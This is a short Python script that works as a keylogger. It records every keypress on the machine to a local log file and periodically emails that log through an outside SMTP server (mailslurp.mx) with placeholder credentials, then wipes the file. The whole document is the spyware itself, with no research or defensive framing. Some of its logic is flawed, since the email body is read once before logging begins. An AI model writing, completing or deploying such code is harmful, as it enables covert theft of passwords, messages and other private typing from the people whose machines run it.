import keyboard

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from datetime import datetime, timedelta

import smtplib
import time

import os

start_dt = datetime.now()
start_dt_str = str(start_dt)[:-7].replace(" ", "-").replace(":", "")
nameForFile = f"{start_dt_str}.txt"

port = 2587



SUBJECT = "Log Data"
sender = 'EMAIL SENDER'
filenamez = f"{os.getcwd()}\log.txt"

msg = MIMEMultipart()
msg['Subject'] = SUBJECT
msg['From'] = sender
msg['To'] = sender

#body = MIMEText("This is an example of how we can send a boarding pass in attachment using Python", "html")
#msg.attach(body)

filename = "log.txt"
if not os.path.exists(filenamez):
    with open(filename, 'w+'): pass
word = open(filename).read()
msg.attach(MIMEText(word, 'Plain'))
#msg.attach(MIMEText(open(filename).read()))

def writer(data):
    with open("log.txt","a") as file:
        file.write(data)

def filter(char):
	if char == "space":
		return " "
	elif len(char) > 1:
		return "[%s]" % char
	else:
		return char

def logger(event):
	writer(filter(event.name))

keyboard.on_press(logger)

def send_email():
    with smtplib.SMTP('mailslurp.mx', port) as server:
        #server = smtplib.SMTP('mx.mailslurp.com', 2525)
        #server.ehlo()
        #server.starttls()
        server.login('Username', 'Password')
        #server.send_message(msg)
        server.sendmail(sender, sender, msg.as_string())
        file = open("log.txt","r+")
        file.truncate(0)
        file.close()
        server.quit()
        print("Successfully sent email")

while 1:
    send_email()

    dt = datetime.now() + timedelta(minutes=30)
    dt = dt.replace(minute=30)

    while datetime.now() < dt:
        time.sleep(1)